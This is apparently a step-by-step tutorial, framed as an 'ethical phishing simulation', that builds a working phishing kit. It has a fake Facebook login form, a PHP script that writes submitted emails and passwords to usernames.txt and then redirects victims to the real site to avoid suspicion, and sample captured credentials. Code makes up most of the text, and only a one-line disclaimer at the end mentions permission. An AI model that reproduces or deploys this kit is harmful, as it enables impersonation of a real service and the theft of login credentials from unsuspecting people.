Try Yourself:

Follow these steps to create your own ethical phishing simulation in a local environment.

Step 1: Create the HTML Login Page

Create a file named index.html. This is the "Hook" that the victim visits. It must look identical to a real login page to be effective.

index.html 
<form action="login.php" method="POST">
    <h2>Login to Facebook</h2>
    <input type="text" name="email" placeholder="Email or Phone" required>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Log In</button>
</form>

Step 2: Create the PHP Theft Script

Create a file named login.php. This script "thefts" (captures) the POST data and redirects the victim to prevent suspicion.

login.php 
<?php
// 1. Capture the data
$email = $_POST['email'];
$pass = $_POST['pass'];

// 2. Save it to a local file
$file = fopen("usernames.txt", "a");
fwrite($file, "Email: " . $email . " | Pass: " . $pass . "\n");
fclose($file);

// 3. Redirect to the REAL website
header("Location: https://www.facebook.com/login");
exit();
?>

Step 3: Saving and Showing Results

When the victim submits the form, their data is saved in usernames.txt. You can view this file on your server to see the "captured" credentials.

usernames.txt (Example Output) 
Email: victim@example.com | Pass: P@ssw0rd123
Email: john.doe@mail.com | Pass: 123456
Important: Only perform this on your own accounts or with explicit permission. Stealing real credentials is a serious cybercrime.
